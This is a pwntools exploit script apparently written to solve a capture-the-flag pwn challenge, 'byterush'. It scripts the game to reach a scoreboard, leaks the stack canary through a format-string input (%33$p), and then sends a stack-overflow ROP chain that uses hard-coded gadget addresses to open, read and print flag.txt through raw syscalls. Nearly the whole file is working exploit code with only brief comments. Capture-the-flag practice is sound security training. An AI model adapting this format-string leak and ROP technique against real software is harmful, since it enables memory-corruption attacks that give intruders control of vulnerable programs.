from pwn import *
from time import sleep

context.arch = "amd64"
context.os = "linux"
context.binary = elf = ELF("./byterush")

# ----
# get 10+ score to access scoreboard ( automation )

p = elf.process()
#p = remote("localhost" , 6110)
#p = remote("tcp.espark.tn" , 6110)

p.recvuntil(b"? (yes/no)")
p.sendline(b"yes")

for i in range(12) :
    p.recvuntil(b"Target: ")
    ltr = p.recv().decode()[1:2]
    answ = str(ord(ltr)).encode()
    log.info(f"Recieved char = {ltr} . Sending {answ} ")
    p.send(answ)
    sleep(0.1)

p.sendline(b"0")

p.recvuntil(b"add yourself to the scoreboard ? (yes/no)")
p.sendline(b"yes")

# -----

# our variable is located in %12$p and its distance from canary = 0xb8 - 0x10 = 168  , meaning between us 168/8 = 21 stack position => canary located in %33$p

p.recvuntil(b"username champion ?")
p.sendline(b"%33$p")
p.recvuntil(b"see the scoreboard ? (yes/no)")
p.sendline(b"yes")
p.recvuntil(b"0x")
canary = int("0x" + p.recvline().decode().strip() , 16)
log.success(f"Leaked canary = {hex(canary)}")

# ----
# main payload ( rop chain )

read = 0x4010e0
data = 0x4040b0
bss = 0x404100

ret = 0x401016
syscall_ret = 0x40129f

xlatb_ret = 0x40129d
bzhi_rbx_rdi_rdx_ret = 0x40128d

pop_rcx_ret = 0x40127d
pop_rdi_ret = 0x40127f
pop_rdx_ret = 0x401287
pop_rsi_r12_ret = 0x401281

xor_rax_ret = 0x401289
sub_rax_43 = 0x401293
add_rax_105 = 0x401298

# -----

fd = 3  # to guess
offset_to_rip = 0xc8  # 200 byte to rip meaning 192 to rbp meaning 184 to canary

pay = b"A"*12 + b"\x00" + b"A"*91 + p64(canary) + p64(0)
pay += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r12_ret) + p64(data) + p64(0) + p64(pop_rdx_ret) + p64(8) + p64(read) # flag.txt

pay += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r12_ret) + p64(bss) + p64(0) + p64(pop_rdx_ret) + p64(0x1) + p64(read) # -> '-' -> 45
pay += p64(pop_rdi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(64) + p64(bzhi_rbx_rdi_rdx_ret) + p64(xor_rax_ret) + p64(xlatb_ret) + p64(sub_rax_43) # '-' - 43 = 2 syscall open
pay += p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_r12_ret) + p64(0) + p64(0) + p64(pop_rdx_ret) + p64(777) + p64(syscall_ret) # call open

pay += p64(pop_rdi_ret) + p64(fd) + p64(pop_rsi_r12_ret) + p64(data) + p64(0) + p64(pop_rdx_ret) + p64(0x50) + p64(read)   # read flag.txt into data

pay += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r12_ret) + p64(bss) + p64(0) + p64(pop_rdx_ret) + p64(0x1) + p64(read) # -> ',' -> 44
pay += p64(pop_rdi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(64) + p64(bzhi_rbx_rdi_rdx_ret) + p64(xor_rax_ret) + p64(xlatb_ret) + p64(sub_rax_43)  # "," - 43 = 1  syscall write
pay += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r12_ret) + p64(data) + p64(0) + p64(pop_rdx_ret) + p64(0x50) +  p64(syscall_ret) # call write

p.recvuntil(b"review so much !")
p.send(pay)

# now we just gotta type manually in interactive : flag.txt-,
p.recvuntil(b"Well noted thanks.")
p.interactive()


